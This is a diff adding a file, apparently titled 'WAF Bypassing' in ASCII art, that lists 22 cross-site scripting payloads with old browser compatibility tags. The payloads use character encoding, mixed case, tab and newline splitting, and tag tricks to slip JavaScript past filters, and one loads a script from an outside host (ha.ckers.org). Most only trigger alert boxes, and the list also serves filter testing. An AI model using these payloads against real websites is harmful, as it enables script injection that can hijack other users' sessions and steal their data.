@@ -1,0 +1,93 @@
+================================================================================================================
+
+
+╦╔═╗  ╦ ╦╔═╗╔═╗  ╔╗ ┬ ┬┌─┐┌─┐┌─┐┌─┐┬┌┐┌┌─┐  
+║║╣   ║║║╠═╣╠╣   ╠╩╗└┬┘├─┘├─┘├─┤└─┐│││││ ┬  
+╩╚═╝  ╚╩╝╩ ╩╚    ╚═╝ ┴ ┴  ┴  ┴ ┴└─┘┴┘└┘└─┘   
+
+
+================================================================================================================
+
+
+1 - ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0]
+
+
+2 - '';!--"<XSS>=&{()}
+
+Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0]
+
+3 - <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+
+Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0]
+
+4 - <IMG SRC="javascript:alert('XSS');">
+
+Browser support: [IE6.0|NS8.1-IE]
+
+5 - <IMG SRC=javascript:alert('XSS')>
+
+Browser support: [IE6.0|NS8.1-IE]
+
+6 - <IMG SRC=JaVaScRiPt:alert('XSS')>
+
+Browser support: [IE6.0|NS8.1-IE]
+
+7 - <IMG SRC=javascript:alert("XSS")>
+
+Browser support: [IE6.0|NS8.1-IE]
+
+8 - <IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+
+Browser support: [IE6.0|NS8.1-IE]
+
+9 - <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+
+Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0]
+
+10 - <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+
+Browser support: [IE6.0|NS8.1-IE]
+
+11 - <IMG SRC=javascript:alert('XSS')>
+
+Browser support: [IE6.0|NS8.1-IE]
+
+12 - <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+
+Browser support: [IE6.0|NS8.1-IE]
+
+13 - <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+
+Browser support: [IE6.0|NS8.1-IE]
+
+14 - <IMG SRC="jav	ascript:alert('XSS');">
+
+Browser support: [IE6.0|NS8.1-IE]
+
+15 - <IMG SRC="jav	ascript:alert('XSS');">
+
+Browser support: [IE7.0|IE6.0|NS8.1-IE]
+
+16 - <IMG SRC="jav
+ascript:alert('XSS');">
+
+Browser support: [IE7.0|IE6.0|NS8.1-IE]
+
+17 - <IMG SRC="jav
+ascript:alert('XSS');">
+
+Browser support: [IE6.0|NS8.1-IE]
+
+18 - <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+
+Browser support: [IE6.0|NS8.1-IE]
+
+19 - <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+
+20 - <BASE HREF="javascript:alert('XSS');//">
+
+21 - <!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+
+22 - <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
